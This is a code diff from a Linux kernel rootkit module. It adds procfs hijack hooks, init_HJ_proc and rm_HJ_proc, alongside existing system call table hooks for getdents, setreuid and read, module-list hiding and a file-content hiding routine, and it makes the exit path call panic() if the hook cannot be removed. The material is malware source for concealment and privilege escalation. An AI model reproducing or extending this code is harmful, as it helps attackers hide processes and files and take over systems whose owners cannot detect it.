@@ -39,6 +39,9 @@ extern struct miscdevice kcr;
 extern asmlinkage long my_getdents(unsigned int, struct linux_dirent64*, unsigned int);
 extern asmlinkage long my_setreuid(uid_t, uid_t);
 extern asmlinkage long my_read(unsigned int, char*, size_t);
+extern bool init_HJ_proc();
+extern bool rm_HJ_proc();
+
 static struct list_head *saved_mod_list_head;
 struct kobject *saved_kobj_parent;
 struct file* hide_contents(char* file, char* target, char* hidden);
@@ -132,6 +135,8 @@ unhiding_module(void) {
 
 
 
+
+
 // Entry function for kernel module initialization
 static int 
 __init init_mod(void){
@@ -158,6 +163,9 @@ __init init_mod(void){
 	sys_call_table[__NR_setreuid] = (unsigned long) my_setreuid;
 	sys_call_table[__NR_read] = (unsigned long) my_read;
 	
+	if(init_HJ_proc() == false)
+		rm_HJ_proc();
+
 	//Changing the control bit back
 	PROT_ENABLE;
 	
@@ -193,6 +201,10 @@ __exit exit_mod(void){
 	sys_call_table[__NR_getdents] = (unsigned long) original_getdents;
 	sys_call_table[__NR_setreuid] = (unsigned long) original_setreuid;
 	sys_call_table[__NR_read] = (unsigned long) original_read;
+
+	if(rm_HJ_proc() == false)
+		panic("oops HJ_proc\n");
+
 	PROT_ENABLE;
 	
 	if (DEBUG == 1) 
